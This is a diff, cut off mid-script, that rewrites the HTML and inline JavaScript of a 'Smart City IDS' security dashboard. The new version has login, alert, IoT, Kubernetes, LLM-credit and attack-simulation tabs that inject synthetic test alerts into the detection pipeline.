@@ -1,539 +1,732 @@
 <!DOCTYPE html>
-<!--
-  Smart City IDS — Security Analyst Dashboard
-  ═══════════════════════════════════════════════════════════════════════════
-
-  Lean HTML skeleton — all CSS lives in css/style.css, all JS in ES6 modules
-  under js/.  This file contains ONLY structure and semantic markup.
-
-  Architecture (post-refactor):
-    index.html          ← you are here (markup only)
-    css/style.css       ← extracted styles (~300 lines)
-    js/state.js         ← centralised observable Store
-    js/api.js           ← unified API client (one place for all fetch calls)
-    js/utils.js         ← pure helper functions (esc, sevBadge, …)
-    js/app.js           ← entry point: auth, tab switching, polling orchestration
-    js/modules/
-      overview.js       ← overview tab renderers
-      alerts.js         ← alert history + SSE live feed
-      kubernetes.js     ← K8s cluster tab
-      iot.js            ← IoT devices tab + WebSocket MQTT bridge
-      llm.js            ← LLM providers tab (latency/cost charts)
-      governance.js     ← Governance / HITL interface
-      attacks.js        ← Attack simulation engine (12 MITRE ATT&CK scenarios)
--->
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
-  <title>Smart City IDS — Security Dashboard</title>
-  <link rel="stylesheet" href="/ui/static/css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart City IDS - AI Security Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap');
+        :root {
+            --bg-dark: #0a0a0f; --bg-card: #13131f;
+            --accent-cyan: #00f0ff; --accent-purple: #b829dd;
+            --accent-green: #00ff88; --accent-red: #ff3366;
+            --accent-orange: #ffaa00; --text-primary: #ffffff; --text-secondary: #a0a0b0;
+        }
+        * { box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: #2a2a3a; border-radius: 4px; }
+        .glass-panel { background: rgba(19,19,31,0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); }
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; animation: fadeIn .25s ease; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:none; } }
+        .tab-btn { border-bottom: 2px solid transparent; color: #a0a0b0; transition: all .2s; cursor: pointer; background: none; border-top: none; border-left: none; border-right: none; }
+        .tab-btn:hover { color: #fff; background: rgba(255,255,255,0.04); }
+        .tab-btn.active { border-bottom-color: var(--accent-cyan) !important; color: var(--accent-cyan) !important; }
+        #loginScreen { position: fixed; inset: 0; z-index: 9999; background: radial-gradient(ellipse at 50% 0%, rgba(0,240,255,0.08) 0%, var(--bg-dark) 70%); display: flex; align-items: center; justify-content: center; }
+        .login-card { width: 420px; max-width: 95vw; background: rgba(19,19,31,0.95); border: 1px solid rgba(0,240,255,0.25); border-radius: 16px; box-shadow: 0 0 40px rgba(0,240,255,0.1); padding: 40px 36px; }
+        .login-input { width: 100%; background: rgba(10,10,15,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px 16px; color: #fff; font-size: 14px; outline: none; transition: border-color .2s; }
+        .login-input:focus { border-color: var(--accent-cyan); }
+        .stat-card { background: rgba(19,19,31,0.8); border: 1px solid rgba(255,255,255,0.07); border-radius: 12px; padding: 20px 24px; transition: all .2s; }
+        .stat-card:hover { border-color: rgba(0,240,255,0.3); transform: translateY(-2px); }
+        .stat-label { font-size: 11px; color: #606080; text-transform: uppercase; letter-spacing: .06em; margin-bottom: 6px; }
+        .stat-value { font-size: 32px; font-weight: 700; line-height: 1; }
+        .stat-sub { font-size: 12px; color: #606080; margin-top: 4px; }
+        .pill { padding: 3px 10px; border-radius: 999px; font-size: 11px; font-weight: 700; border: 1px solid rgba(255,255,255,0.15); }
+        .pill-ok  { background: rgba(0,255,136,0.15);  color: #00ff88; border-color: #00ff88; }
+        .pill-warn{ background: rgba(255,170,0,0.15);  color: #ffaa00; border-color: #ffaa00; }
+        .pill-err { background: rgba(255,51,102,0.15); color: #ff3366; border-color: #ff3366; }
+        .sev-badge { padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; display: inline-block; white-space: nowrap; }
+        .sev-crit { background: rgba(220,38,38,0.2);  color: #f87171; border: 1px solid rgba(220,38,38,0.4); }
+        .sev-high { background: rgba(234,88,12,0.2);  color: #fb923c; border: 1px solid rgba(234,88,12,0.4); }
+        .sev-med  { background: rgba(202,138,4,0.2);  color: #facc15; border: 1px solid rgba(202,138,4,0.4); }
+        .sev-low  { background: rgba(22,163,74,0.2);  color: #4ade80; border: 1px solid rgba(22,163,74,0.4); }
+        .health-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .health-row:last-child { border-bottom: none; }
+        .health-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+        .health-ok   { background: #00ff88; box-shadow: 0 0 6px #00ff88; }
+        .health-warn { background: #ffaa00; box-shadow: 0 0 6px #ffaa00; }
+        .health-err  { background: #ff3366; box-shadow: 0 0 6px #ff3366; }
+        .alert-row { display: flex; align-items: flex-start; gap: 10px; padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,0.04); font-size: 13px; }
+        .alert-row:hover { background: rgba(255,255,255,0.02); }
+        .alert-row:last-child { border-bottom: none; }
+        .pipe-stage { display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: rgba(0,0,0,0.3); border-radius: 8px; margin-bottom: 6px; }
+        .attack-card { background: rgba(19,19,31,0.8); border: 1px solid rgba(255,255,255,0.07); border-radius: 12px; padding: 16px; cursor: pointer; transition: all .2s; }
+        .attack-card:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,.4); }
+    </style>
 </head>
-<body>
-
-<!-- ═══════════════════════════════════════════════════════════════════════
-     LOGIN SCREEN
-     ═══════════════════════════════════════════════════════════════════════ -->
+<body class="min-h-screen">
+<!-- ═══════════════════════ LOGIN SCREEN ══════════════════════════════════ -->
 <div id="loginScreen">
-  <div class="login-card">
-    <h1>Smart City IDS</h1>
-    <p>Security Analyst Dashboard &mdash; Intrusion Detection System</p>
-    <label>Username</label>
-    <input id="loginUser" value="admin" autocomplete="username">
-    <label>Password</label>
-    <input id="loginPass" type="password" value="admin" autocomplete="current-password">
-    <button onclick="doLogin()">Sign In</button>
-    <div id="loginError"></div>
-  </div>
+    <div class="login-card">
+        <div style="text-align:center;margin-bottom:32px;">
+            <div style="width:64px;height:64px;border-radius:14px;background:linear-gradient(135deg,#0891b2,#7c3aed);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+                <i class="fas fa-shield-alt" style="font-size:28px;color:#fff;"></i>
+            </div>
+            <h1 style="font-size:22px;font-weight:800;margin:0 0 4px;">Smart City IDS</h1>
+            <p style="font-size:13px;color:#606080;margin:0;">AI Security Command Center — Operator Login</p>
+        </div>
+        <div style="margin-bottom:16px;">
+            <label style="font-size:11px;font-weight:700;text-transform:uppercase;color:#606080;display:block;margin-bottom:6px;">Username</label>
+            <input type="text" id="loginUser" class="login-input" placeholder="Username" autocomplete="username"
+                onkeydown="if(event.key==='Enter') document.getElementById('loginPass').focus()">
+        </div>
+        <div style="margin-bottom:20px;">
+            <label style="font-size:11px;font-weight:700;text-transform:uppercase;color:#606080;display:block;margin-bottom:6px;">Password</label>
+            <input type="password" id="loginPass" class="login-input" placeholder="••••••••" autocomplete="current-password"
+                onkeydown="if(event.key==='Enter') app.login()">
+        </div>
+        <div id="loginError" style="display:none;color:#ff3366;font-size:13px;text-align:center;margin-bottom:16px;background:rgba(255,51,102,0.08);padding:8px 12px;border-radius:6px;border:1px solid rgba(255,51,102,0.2);"></div>
+        <button id="loginBtn" onclick="app.login()" style="width:100%;padding:14px;background:linear-gradient(135deg,#0891b2,#7c3aed);border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;transition:opacity .2s;">
+            <i class="fas fa-sign-in-alt" style="margin-right:8px;"></i>Authenticate
+        </button>
+    </div>
+</div>
+
+<!-- ══════════════════════ MAIN DASHBOARD ════════════════════════════════ -->
+<div id="dashboard" style="display:none;">
+
+    <!-- HEADER -->
+    <header class="glass-panel sticky top-0 z-50" style="border-bottom:1px solid rgba(255,255,255,0.07);">
+        <div style="padding:12px 24px;display:flex;align-items:center;justify-content:space-between;">
+            <div style="display:flex;align-items:center;gap:14px;">
+                <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#0891b2,#7c3aed);display:flex;align-items:center;justify-content:center;">
+                    <i class="fas fa-shield-alt" style="font-size:18px;color:#fff;"></i>
+                </div>
+                <div>
+                    <div style="font-size:17px;font-weight:800;letter-spacing:-.02em;">Smart City IDS</div>
+                    <div style="font-size:11px;color:#606080;font-family:'JetBrains Mono',monospace;">AI-Enhanced Security Command Center</div>
+                </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+                <span id="clusterPill" class="pill">K8s —</span>
+                <span id="llmPill"    class="pill">LLM —</span>
+                <span id="govPill"    class="pill">Gov —</span>
+                <div style="width:1px;height:24px;background:rgba(255,255,255,0.1);margin:0 4px;"></div>
+                <span id="uptimeLabel" style="font-size:11px;color:#606080;font-family:'JetBrains Mono',monospace;">Uptime: —</span>
+                <button onclick="app.logout()" style="padding:7px 14px;background:rgba(255,51,102,0.12);border:1px solid rgba(255,51,102,0.3);color:#ff6688;border-radius:8px;font-size:13px;cursor:pointer;">
+                    <i class="fas fa-sign-out-alt mr-1"></i>Exit
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- NAV TABS -->
+    <nav class="glass-panel" style="border-bottom:1px solid rgba(255,255,255,0.07);">
+        <div style="padding:0 24px;overflow-x:auto;display:flex;gap:2px;">
+            <button class="tab-btn px-5 py-4 text-sm font-semibold active" data-tab="overview"    onclick="app.switchTab('overview')"><i class="fas fa-chart-line mr-2"></i>Overview</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="alerts"     onclick="app.switchTab('alerts')"><i class="fas fa-bell mr-2"></i>Alerts<span id="alertBadge" style="margin-left:6px;padding:1px 6px;border-radius:999px;background:#dc2626;font-size:10px;font-weight:800;display:none;"></span></button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="iot"        onclick="app.switchTab('iot')"><i class="fas fa-network-wired mr-2"></i>IoT Mesh</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="kubernetes" onclick="app.switchTab('kubernetes')"><i class="fas fa-cubes mr-2"></i>K8s Cluster</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="credits"    onclick="app.switchTab('credits')"><i class="fas fa-wallet mr-2"></i>Credits</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="attacks"    onclick="app.switchTab('attacks')"><i class="fas fa-bug mr-2"></i>Attack Simulation</button>
+        </div>
+    </nav>
+
+    <!-- MAIN CONTENT -->
+    <main style="padding:24px;">
+
+        <!-- ── OVERVIEW ─────────────────────────────────────────────── -->
+        <div id="tab-overview" class="tab-panel active">
+            <div id="overviewStats" class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                <div class="stat-card" style="grid-column:1/-1;text-align:center;color:#606080;"><i class="fas fa-spinner fa-spin mr-2"></i>Loading…</div>
+            </div>
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <div class="lg:col-span-2 space-y-6">
+                    <div class="glass-panel rounded-xl p-6">
+                        <h3 style="font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;">
+                            <i class="fas fa-stream" style="color:var(--accent-cyan);"></i> Processing Pipeline
+                            <span style="font-size:11px;color:#606080;font-weight:400;">— alert ingestion → LLM analysis → automated action</span>
+                        </h3>
+                        <div id="pipelineOverview"><div style="color:#606080;font-size:13px;">Loading pipeline data…</div></div>
+                    </div>
+                    <div class="glass-panel rounded-xl p-6">
+                        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+                            <h3 style="font-size:15px;font-weight:700;display:flex;align-items:center;gap:8px;"><i class="fas fa-list-ul" style="color:#facc15;"></i> Recent Alerts</h3>
+                            <button onclick="app.switchTab('alerts')" style="font-size:12px;color:var(--accent-cyan);background:none;border:none;cursor:pointer;text-decoration:underline;">View all →</button>
+                        </div>
+                        <div id="alertFeed"><div style="color:#606080;font-size:13px;">Loading…</div></div>
+                    </div>
+                </div>
+                <div class="space-y-6">
+                    <div class="glass-panel rounded-xl p-6">
+                        <h3 style="font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;"><i class="fas fa-heartbeat" style="color:#00ff88;"></i> System Health</h3>
+                        <div id="systemHealth"><div class="health-row"><div class="health-dot health-warn"></div><span style="font-size:13px;">Connecting…</span></div></div>
+                    </div>
+                    <div class="glass-panel rounded-xl p-6">
+                        <h3 style="font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;"><i class="fas fa-brain" style="color:#b829dd;"></i> LLM Engines</h3>
+                        <div id="llmStatus"><div style="color:#606080;font-size:13px;">Loading…</div></div>
+                    </div>
+                    <div class="glass-panel rounded-xl p-6">
+                        <h3 style="font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;"><i class="fas fa-coins" style="color:#facc15;"></i> API Credits
+                        <button onclick="app.refreshCredits()" style="margin-left:auto;font-size:11px;color:#606080;background:none;border:none;cursor:pointer;" title="Refresh credits"><i class="fas fa-sync-alt"></i></button></h3>
+                        <div id="creditsPanel"><div style="color:#606080;font-size:13px;">Loading…</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ── ALERTS ───────────────────────────────────────────────── -->
+        <div id="tab-alerts" class="tab-panel">
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px;">
+                <div>
+                    <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">Alert History</h2>
+                    <p style="font-size:13px;color:#606080;margin:0;">All security events processed by the IDS pipeline, scored by the LLM. Severity scale: 1–3 Low, 4–5 Medium, 6–7 High, 8–10 Critical.</p>
+                </div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+                    <select id="alertSevFilter" onchange="app.renderAlerts()" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 12px;color:#fff;font-size:13px;">
+                        <option value="all">All severities</option>
+                        <option value="critical">Critical (8-10)</option>
+                        <option value="high">High (6-7)</option>
+                        <option value="medium">Medium (4-5)</option>
+                        <option value="low">Low (1-3)</option>
+                    </select>
+                    <button onclick="app.switchTab('alerts')" style="padding:8px 16px;background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);border-radius:8px;font-size:13px;cursor:pointer;"><i class="fas fa-sync-alt mr-2"></i>Refresh</button>
+                </div>
+            </div>
+            <div id="alertsTable" class="glass-panel rounded-xl" style="min-height:300px;overflow:hidden;">
+                <div style="padding:40px;text-align:center;color:#606080;"><i class="fas fa-spinner fa-spin mr-2"></i>Loading alerts…</div>
+            </div>
+        </div>
+
+        <!-- ── IOT MESH ────────────────────────────────────────────── -->
+        <div id="tab-iot" class="tab-panel">
+            <div style="margin-bottom:20px;">
+                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">IoT Device Mesh</h2>
+                <p style="font-size:13px;color:#606080;margin:0;">All IoT workloads running in the K8s cluster — cameras, sensors, and protocol emulators.</p>
+            </div>
+            <div id="iotStats" class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6"></div>
+            <div id="iotTable" class="glass-panel rounded-xl p-4"></div>
+        </div>
+
+        <!-- ── KUBERNETES ─────────────────────────────────────────── -->
+        <div id="tab-kubernetes" class="tab-panel">
+            <div style="margin-bottom:20px;">
+                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">Kubernetes Cluster</h2>
+                <p style="font-size:13px;color:#606080;margin:0;">Live cluster state — pods are running containers; services are stable network endpoints routing traffic to pods.</p>
+            </div>
+            <div id="k8sStats" class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6"></div>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <div id="podsTable" class="glass-panel rounded-xl p-4"></div>
+                <div id="servicesTable" class="glass-panel rounded-xl p-4"></div>
+            </div>
+        </div>
+
+        <!-- ── CREDITS ───────────────────────────────────────────── -->
+        <div id="tab-credits" class="tab-panel">
+            <div style="margin-bottom:20px;">
+                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">LLM Credits & Billing</h2>
+                <p style="font-size:13px;color:#606080;margin:0;">Monitor remaining credits for all LLM providers. Low credit warnings help prevent service interruptions.</p>
+            </div>
+            
+            <!-- Credit Summary Cards -->
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                <div class="stat-card">
+                    <div class="stat-label">Total Available</div>
+                    <div class="stat-value" id="creditTotal">—</div>
+                    <div class="stat-sub">Across all providers</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Healthy Providers</div>
+                    <div class="stat-value" id="creditHealthy">—</div>
+                    <div class="stat-sub">With sufficient credits</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Low Credit Alerts</div>
+                    <div class="stat-value" id="creditAlerts" style="color:#f59e0b;">—</div>
+                    <div class="stat-sub">Providers need attention</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Estimated Cost Today</div>
+                    <div class="stat-value" id="creditCostToday">—</div>
+                    <div class="stat-sub">USD spent on analysis</div>
+                </div>
+            </div>
+            
+            <!-- Provider Credit Cards -->
+            <div id="creditProviderCards" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
+                <!-- Cards will be populated by JavaScript -->
+            </div>
+            
+            <!-- Credit Alerts Section -->
+            <div id="creditAlertSection" class="glass-panel rounded-xl p-4 mb-6" style="display:none;">
+                <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;color:#f59e0b;"><i class="fas fa-exclamation-triangle mr-2"></i>Credit Alerts</h3>
+                <div id="creditAlertList"></div>
+            </div>
+            
+            <!-- Refresh Button -->
+            <div style="display:flex;gap:12px;justify-content:flex-end;">
+                <button onclick="window.refreshCredits()" class="btn" style="background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);">
+                    <i class="fas fa-sync-alt mr-2"></i>Refresh Credits
+                </button>
+            </div>
+        </div>
+
+        <!-- ── ATTACK SIM ─────────────────────────────────────────── -->
+        <div id="tab-attacks" class="tab-panel">
+            <div style="margin-bottom:20px;">
+                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">Attack Simulation</h2>
+                <p style="font-size:13px;color:#606080;margin:0;">Inject synthetic security events into the IDS pipeline to test detection and automated response. Each scenario maps to a MITRE ATT&amp;CK for ICS technique.</p>
+            </div>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                <div class="stat-card"><div class="stat-label">Scenarios</div><div class="stat-value">12</div><div class="stat-sub">Ready to inject</div></div>
+                <div class="stat-card"><div class="stat-label">Runs this session</div><div class="stat-value" id="atkRunCount">0</div><div class="stat-sub">Since dashboard load</div></div>
+                <div class="stat-card"><div class="stat-label">Last LLM severity</div><div class="stat-value" id="atkLastSev">—</div><div class="stat-sub">Out of 10</div></div>
+                <div class="stat-card"><div class="stat-label">Last automated action</div><div class="stat-value" style="font-size:14px;" id="atkLastAction">—</div><div class="stat-sub">Executed by K8s automation</div></div>
+            </div>
+            <div id="attackGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6"></div>
+            <div class="glass-panel rounded-xl p-4">
+                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
+                    <h3 style="font-size:14px;font-weight:700;">Injection Log</h3>
+                    <button onclick="document.getElementById('attackLog').textContent='Log cleared.\n'" style="font-size:12px;color:#606080;background:none;border:none;cursor:pointer;">Clear</button>
+                </div>
+                <pre id="attackLog" style="background:#000;border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:14px;height:280px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px;color:#00ff88;white-space:pre-wrap;">Ready. Click a scenario above to inject a test alert into the IDS pipeline.
+</pre>
+            </div>
+        </div>
+
+    </main>
+</div>
+
+<!-- LIVE PIPELINE FEED -->
+<div id="liveFeedCard" class="glass-panel rounded-xl" style="margin:0 24px 24px;border:1px solid rgba(0,240,255,0.3);display:none;">
+    <div style="display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.07);">
+        <span id="liveFeedDot" style="width:8px;height:8px;border-radius:50%;background:#eab308;flex-shrink:0;"></span>
+        <strong style="font-size:13px;">Live Pipeline Feed</strong>
+        <span id="liveFeedStatus" style="font-size:12px;color:#a0a0b0;">Connecting…</span>
+        <span id="liveFeedCount" style="margin-left:auto;font-size:11px;background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.2);padding:2px 8px;border-radius:4px;color:var(--accent-cyan);">0 events</span>
+    </div>
+    <div style="padding:12px;">
+        <pre id="liveFeedLog" style="font-size:11.5px;color:#a0a0b0;max-height:180px;overflow-y:auto;white-space:pre-wrap;line-height:1.6;background:#0a0a0f;padding:12px;border-radius:8px;margin:0;">Connecting to live event stream…</pre>
+    </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════════════════
-     DASHBOARD
+     DASHBOARD APPLICATION — single file, no ES6 modules, no import()
+     All symbols available immediately at script parse time.
      ═══════════════════════════════════════════════════════════════════════ -->
-<div id="dashboard">
+<script>
+'use strict';
 
-  <!-- Top Bar -->
-  <div class="topbar">
-    <div class="brand">&#x1F6E1;&#xFE0F; Smart City IDS</div>
-    <div class="topbar-right">
-      <span id="clusterPill" class="pill pill-ok">K8s Connected</span>
-      <span id="llmPill" class="pill pill-ok">LLM Ready</span>
-      <span id="govPill" class="pill pill-ok">Assisted Mode</span>
-      <span style="color:var(--text3);font-size:12px" id="uptimeLabel">Uptime: --</span>
-      <button class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark/Light theme" id="themeToggleBtn">&#x1F319;</button>
-      <button class="theme-toggle" onclick="toggleAudioAlerts()" title="Toggle Audio Alerts" id="audioToggleBtn" style="font-size:12px">&#x1F507;</button>
-      <button onclick="doLogout()">Sign Out</button>
-    </div>
-  </div>
-  <div style="padding:8px 24px;border-bottom:1px solid var(--border);background:rgba(0,212,255,.03);font-size:12px;color:var(--text2)">
-    This dashboard helps security analysts triage and explain alerts, not replace them.
-  </div>
+const CFG = { API: '', POLL: 15000, TOKEN_KEY: 'ids_token' };
+const $   = id => document.getElementById(id);
 
-  <!-- Tab Bar -->
-  <div class="tab-bar">
-    <button class="tab-btn active" data-tab="overview">Overview</button>
-    <button class="tab-btn" data-tab="alerts">Incidents</button>
-    <button class="tab-btn" data-tab="governance">Approvals</button>
-    <button class="tab-btn" data-tab="threats">Threats</button>
-    <button class="tab-btn" data-tab="iot">IoT</button>
-    <button class="tab-btn" data-tab="kubernetes">K8s</button>
-    <button class="tab-btn" data-tab="llm">LLM Providers</button>
-    <button class="tab-btn" data-tab="metrics">Metrics</button>
-    <button class="tab-btn" data-tab="hunt">Hunt</button>
-    <button class="tab-btn" data-tab="attacks">Attack Simulation</button>
-  </div>
+function esc(s) {
+    if (s == null) return '';
+    const d = document.createElement('div'); d.textContent = String(s); return d.innerHTML;
+}
+function fmtDuration(s) {
+    s = Math.floor(s || 0);
+    if (s < 60)   return s + 's';
+    if (s < 3600) return Math.floor(s/60) + 'm ' + (s%60) + 's';
+    return Math.floor(s/3600) + 'h ' + Math.floor((s%3600)/60) + 'm';
+}
+function fmtTime(ts) {
+    if (!ts) return '—';
+    try { return new Date(ts).toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
+    catch { return '—'; }
+}
+function sevInfo(n) {
+    n = parseInt(n) || 0;
+    if (n >= 8) return { cls:'sev-crit', label:`CRITICAL (${n}/10)`, short:'CRIT', color:'#f87171' };
+    if (n >= 6) return { cls:'sev-high', label:`HIGH (${n}/10)`,     short:'HIGH', color:'#fb923c' };
+    if (n >= 4) return { cls:'sev-med',  label:`MEDIUM (${n}/10)`,   short:'MED',  color:'#facc15' };
+    return             { cls:'sev-low',  label:`LOW (${n}/10)`,       short:'LOW',  color:'#4ade80' };
+}
 
-  <!-- ═════════════════════════════════════════════════════════════════════
-       TAB: Overview
-       ═════════════════════════════════════════════════════════════════════ -->
-  <div class="tab-panel active" id="tab-overview">
-    <div class="stat-grid" id="overviewStats"></div>
-    <div class="pipeline-grid" id="pipelineOverview"></div>
-    <div class="card">
-      <div class="card-header"><h3>Alert Fatigue (Last Window)</h3></div>
-      <div class="card-body" id="alertFatigue"></div>
-    </div>
-    <div class="row">
-      <div class="card">
-        <div class="card-header"><h3>Live Alert Feed</h3><span class="badge badge-info" id="alertCountBadge">0</span></div>
-        <div class="card-body no-pad">
-          <div class="feed" id="alertFeed"><div style="padding:20px;color:var(--text3);text-align:center">Waiting for alerts...</div></div>
-        </div>
-      </div>
-      <div>
-        <div class="card">
-          <div class="card-header"><h3>LLM Provider Status</h3></div>
-          <div class="card-body" id="llmOverview"></div>
-        </div>
-        <div class="card">
-          <div class="card-header"><h3>System Health</h3></div>
-          <div class="card-body" id="systemHealth"></div>
-        </div>
-      </div>
-    </div>
+// ── API client ─────────────────────────────────────────────────────────
+const api = {
+    token: localStorage.getItem(CFG.TOKEN_KEY) || '',
+    async _fetch(path, opts={}) {
+        try {
+            const res = await fetch(CFG.API+path, { ...opts, headers:{'Authorization':'Bearer '+api.token,'Content-Type':'application/json',...(opts.headers||{})} });
+            // Never auto-logout on 401 — governance/llm endpoints may return 401
+            // when the feature is disabled; user must click Exit explicitly
+            if (!res.ok) return null;
+            return res.json().catch(() => null);
+        } catch { return null; }
+    },
+    async _pub(path) {
+        try { const r=await fetch(CFG.API+path); if(!r.ok) return null; return r.json().catch(()=>null); } catch { return null; }
+    },
+    getHealth()   { return this._pub('/health'); },
+    getMetrics()  { return this._pub('/api/metrics'); },
+    getAlerts(n)  { return this._pub(`/api/alerts?limit=${n||50}`); },
+    getIoT()      { return this._pub('/api/iot/devices'); },
+    getPipeline() { return this._pub('/api/pipeline-overview'); },
+    getGov()      { return this._fetch('/api/governance/status'); },
+    getLLMDiag()  { return this._pub('/api/llm/diagnostics'); },
+    getCredits()  { return this._pub('/api/llm/credits/'); },
+    injectAlert(p){ return fetch(CFG.API+'/api/alerts/internal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)}).then(r=>r.json()).catch(()=>({error:'Network error'})); }
+};
 
-    <!-- Live Pipeline Feed — inside overview tab -->
-    <div class="card" id="liveFeedCard" style="margin:0 0 16px;border:1px solid var(--accent);border-radius:8px">
-    <div class="card-header" style="cursor:pointer" onclick="toggleLiveFeed()">
-      <h3><span id="liveFeedDot" class="dot dot-yellow" style="margin-right:6px"></span>Live Pipeline Feed</h3>
-      <span style="font-size:11px;color:var(--text3);margin-left:8px" id="liveFeedStatus">Connecting...</span>
-      <span class="badge badge-info" id="liveFeedCount" style="margin-left:8px">0</span>
-      <div style="margin-left:auto;display:flex;gap:6px">
-        <button class="btn btn-outline btn-sm" onclick="event.stopPropagation();clearLiveFeed()">Clear</button>
-        <button class="btn btn-outline btn-sm" id="liveFeedToggleBtn" onclick="event.stopPropagation();toggleLiveFeed()">&#x25BC;</button>
-      </div>
-    </div>
-    <div class="card-body" id="liveFeedBody" style="display:block">
-      <pre id="liveFeedLog" style="font-size:11.5px;color:var(--text2);max-height:500px;overflow-y:auto;white-space:pre-wrap;line-height:1.6;background:var(--bg);padding:12px;border-radius:6px;border:1px solid var(--border)">Connecting to live event stream...</pre>
-    </div>
-  </div>
+// ── Live SSE feed ──────────────────────────────────────────────────────
+const liveFeed = {
+    sse: null, count: 0,
+    connect() {
+        if (this.sse) this.sse.close();
+        const dot=$('liveFeedDot'), st=$('liveFeedStatus');
+        if (dot) dot.style.background='#eab308';
+        if (st)  st.textContent='Connecting…';
+        this.sse = new EventSource(CFG.API+'/api/alerts/live');
+        this.sse.onopen = () => {
+            if (dot) dot.style.background='#22c55e';
+            if (st)  st.textContent='Connected — streaming all alert processing';
+        };
+        const _handleAlert = ev => {
+            try {
+                const d=JSON.parse(ev.data);
+                // Skip keepalive pings and non-alert messages
+                if (!d || d.type==='connected' || d.type==='keepalive') return;
+                this.count++;
+                const ce=$('liveFeedCount'); if(ce) ce.textContent=this.count+(this.count===1?' event':' events');
+                this._append(d); app.onLiveAlert(d);
+            } catch {}
+        };
+        this.sse.addEventListener('alert', _handleAlert);
+        // Fallback: some proxies strip SSE event names, falling back to message
+        this.sse.addEventListener('message', _handleAlert);
+        this.sse.addEventListener('connected', () => {
+            const log=$('liveFeedLog');
+            if(log && (log.textContent==='Connecting…'||log.textContent==='')) log.textContent='Waiting for alerts…';
+        });
+        this.sse.onerror = () => {
+            if (dot) dot.style.background='#ef4444';
+            if (st)  st.textContent='Disconnected — reconnecting…';
+        };
+    },
+    _append(d) {
+        const log=$('liveFeedLog'); if(!log) return;
